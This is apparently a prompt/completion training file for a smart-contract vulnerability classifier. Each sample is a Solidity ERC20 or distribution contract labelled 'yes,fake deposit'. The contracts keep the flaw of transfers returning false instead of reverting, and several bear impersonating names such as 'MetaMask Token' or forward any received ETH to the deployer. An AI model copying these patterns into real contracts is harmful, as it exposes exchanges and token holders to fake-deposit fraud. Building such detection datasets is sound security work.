{"prompt": "pragma solidity >=0.4.24;\n\nlibrary SafeMath {\n function add(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c)\n {\n c = a + b;\n require(c >= a);\n }\n\n function sub(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c)\n {\n require(b <= a);\n c = a - b;\n }\n\n function mul(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n \n function div(\n uint256 a,\n uint256 b)\n internal\n pure\n returns(uint256 c) {\n require(b > 0);\n c = a / b;\n }\n}\n\ninterface IERC20 {\n // ERC20 Optional Views\n function name() external view returns (string memory);\n\n function symbol() external view returns (string memory);\n\n function decimals() external view returns (uint8);\n\n // Views\n function totalSupply() external view returns (uint);\n\n function balanceOf(address owner) external view returns (uint);\n\n function allowance(address owner, address spender) external view returns (uint);\n\n // Mutative functions\n function transfer(address to, uint value) external returns (bool);\n\n function approve(address spender, uint value) external returns (bool);\n\n function transferFrom(\n address from,\n address to,\n uint value\n ) external returns (bool);\n\n // Events\n event Transfer(address indexed from, address indexed to, uint value);\n\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\n\n// https://docs.synthetix.io/contracts/source/contracts/owned\ncontract Owned {\n address public owner;\n address public nominatedOwner;\n\n constructor(address _owner) public {\n require(_owner != address(0), \"Owner address cannot be 0\");\n owner = _owner;\n emit OwnerChanged(address(0), _owner);\n }\n\n function nominateNewOwner(address _owner) external onlyOwner {\n nominatedOwner = _owner;\n emit OwnerNominated(_owner);\n }\n\n function acceptOwnership() external {\n require(msg.sender == nominatedOwner, \"You must be nominated before you can accept ownership\");\n emit OwnerChanged(owner, nominatedOwner);\n owner = nominatedOwner;\n nominatedOwner = address(0);\n }\n\n modifier onlyOwner {\n _onlyOwner();\n _;\n }\n\n function _onlyOwner() private view {\n require(msg.sender == owner, \"Only the contract owner may perform this action\");\n }\n\n event OwnerNominated(address newOwner);\n event OwnerChanged(address oldOwner, address newOwner);\n}\n\ncontract Pausable is Owned {\n event Pause();\n event Unpause();\n\n bool public paused = false;\n\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n\n modifier whenPaused() {\n require(paused);\n _;\n }\n\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\n\n\n\n\npragma solidity >=0.4.24;\n\ncontract IDODistribution is Owned, Pausable {\n \n using SafeMath for uint;\n\n \n address public authority;\n\n \n address public erc20Address;\n\n\n mapping(address => uint) balances;\n mapping(address => uint) counts;\n\n uint public totalSupply;\n\n constructor(\n address _owner,\n address _authority\n ) public Owned(_owner) {\n authority = _authority;\n }\n\n function balanceOf(address _address) public view returns (uint) {\n return balances[_address];\n }\n\n function depositNumberOf(address _address) public view returns (uint) {\n return counts[_address];\n }\n\n // ========== EXTERNAL SETTERS ==========\n\n function setTokenAddress(address _erc20Address) public onlyOwner {\n erc20Address = _erc20Address;\n }\n\n \n function setAuthority(address _authority) public onlyOwner {\n authority = _authority;\n }\n\n function batchDeposit(address[] destinations, uint[] amounts) public returns (bool) {\n require(msg.sender == authority, \"Caller is not authorized\");\n require(erc20Address != address(0), \"erc20 token address is not set\");\n require(destinations.length == amounts.length, \"length of inputs not match\");\n\n // we don't need check amount[i] > 0 or destinations != 0x0 because they cannot claim anyway\n uint amount = 0;\n for (uint i = 0; i < amounts.length; i++) {\n amount = amount.add(amounts[i]);\n balances[destinations[i]] = balances[destinations[i]].add(amounts[i]);\n counts[destinations[i]] += 1;\n }\n\n totalSupply = totalSupply.add(amount);\n\n emit TokenDeposit(amount);\n return true;\n }\n\n function claim() public whenNotPaused returns (bool) {\n require(erc20Address != address(0), \"erc20 token address is not set\");\n require(balances[msg.sender] > 0, \"account balance is zero\");\n\n uint _amount = balances[msg.sender];\n require(\n IERC20(erc20Address).balanceOf(address(this)) >= _amount,\n \"This contract does not have enough tokens to distribute\"\n );\n\n balances[msg.sender] = 0;\n IERC20(erc20Address).transfer(msg.sender, _amount);\n totalSupply = totalSupply.sub(_amount);\n\n emit UserClaimed(msg.sender, _amount);\n return true;\n }\n\n function transfer(address _address, uint _amount) public returns (bool) {\n require(msg.sender == authority, \"Caller is not authorized\");\n require(erc20Address != address(0), \"erc20 token address is not set\");\n require(\n IERC20(erc20Address).balanceOf(address(this)) >= _amount,\n \"This contract does not have enough tokens to distribute\"\n );\n IERC20(erc20Address).transfer(_address, _amount);\n return true;\n\n }\n\n \n event TokenDeposit(uint _amount);\n event UserClaimed(address _address, uint _amount);\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Smoothy is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000*10**uint256(decimals);\n string public constant name = \"Smoothy.finance\";\n string public constant symbol = \"SMTY\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract MetaMaskToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"MetaMask Token\";\n string public constant symbol = \"MSKT\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract ProMind is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply * 10 ** uint256(decimals);\n _balances[msg.sender] = initialSupply * 10 ** uint256(decimals);\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ElonTweets is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Elon Tweets\";\n string public constant symbol = \"ELONT \ud83d\udc26\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n/// @return total amount of tokens\nfunction totalSupply() constant returns (uint256 supply) {}\n\n/// @param _owner The address from which the balance will be retrieved\n/// @return The balance\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\n\n/// @notice send `_value` token to `_to` from `msg.sender`\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\n\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n/// @param _from The address of the sender\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @param _value The amount of wei to be approved for transfer\n/// @return Whether the approval was successful or not\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\n\n/// @param _owner The address of the account owning tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @return Amount of remaining tokens allowed to spent\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\n\n\ncontract StandardToken is Token {\n\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n//Default assumes totalSupply can't be over max (2^256 - 1).\n//If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n//Replace the if with this one instead.\n//if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\nif (balances[msg.sender] >= _value && _value > 0) {\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nTransfer(msg.sender, _to, _value);\nreturn true;\n} else { return false; }\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n//same as above. Replace this line with the following if you want to protect against wrapping uints.\n//if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\nif (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nTransfer(_from, _to, _value);\nreturn true;\n} else { return false; }\n}\n\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\nreturn balances[_owner];\n}\n\nfunction approve(address _spender, uint256 _value) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\n\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\n\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\nfunction () {\n//if ether is sent to this address, send it back.\nthrow;\n}\n\n\n\n\nstring public name; //fancy name: eg Simon Bucks\nuint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\nstring public symbol; //An identifier: eg SBX\nstring public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\nfunction ERC20Token(\n) {\nbalances[msg.sender] = 1000; // Give the creator all initial tokens (100000 for example)\ntotalSupply = 1000; // Update total supply (100000 for example)\nname = \"Cryptogate\"; // Set the name for display purposes\ndecimals = 0; // Amount of decimals for display purposes\nsymbol = \"CG\"; // Set the symbol for display purposes\n}\n\n\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\n\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n//receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n//it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract Arzdigital {\n/// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\ncontract StandardToken is Arzdigital {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n//name this contract whatever you\u2019d like\ncontract Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n\n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It\u2019s like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// \u0628\u0631\u0627\u06cc \u062a\u0648\u06a9\u0646 \u062e\u0648\u062f \u0645\u0642\u062f\u0627\u0631\u0647\u0627\u06cc \u0632\u06cc\u0631 \u0631\u0627 \u062a\u063a\u06cc\u06cc\u0631 \u062f\u0647\u06cc\u062f\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction Token(\n ) {\n balances[msg.sender] = 1000000000000; // \u062a\u0645\u0627\u0645 \u062a\u0648\u06a9\u0646\u0647\u0627\u06cc \u0633\u0627\u062e\u062a\u0647 \u0634\u062f\u0647 \u0633\u0627\u0632\u0646\u062f\u0647 \u0628\u0631\u0633\u062f -\u0639\u062f\u062f\u06cc \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f \u0645\u062b\u0644\u0627 100000\n totalSupply = 1000000000000; // \u062a\u0645\u0627\u0645 \u0639\u0631\u0636\u0647\n name = 'HAZEM & AMIR'; // \u0646\u0627\u0645 \u062a\u0648\u06a9\u0646\n decimals = 5; // \u0627\u0639\u0634\u0627\u0631\n symbol = 'HMR'; // \u0646\u0645\u0627\u062f \u062a\u0648\u06a9\u0646\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3('receiveApproval(address,uint256,address,bytes)'))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant public returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) view public returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public returns (bool success) { return true; }\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { return true;}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public returns (bool success) { return true; }\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Papillon is StandardToken {\n\n function () public {\n //if ether is sent to this address, send it back.\n revert();\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n constructor() public {\n balances[msg.sender] = 1000000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"Papillon\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"PAPI\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'ShibaInuBadger' token contract\n//\n// Symbol : SHIB \ud83e\udda1\n// Name : Shiba Inu Badger\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaInuBadger is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Inu Badger\";\n string public constant symbol = \"SHIB \ud83e\udda1\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
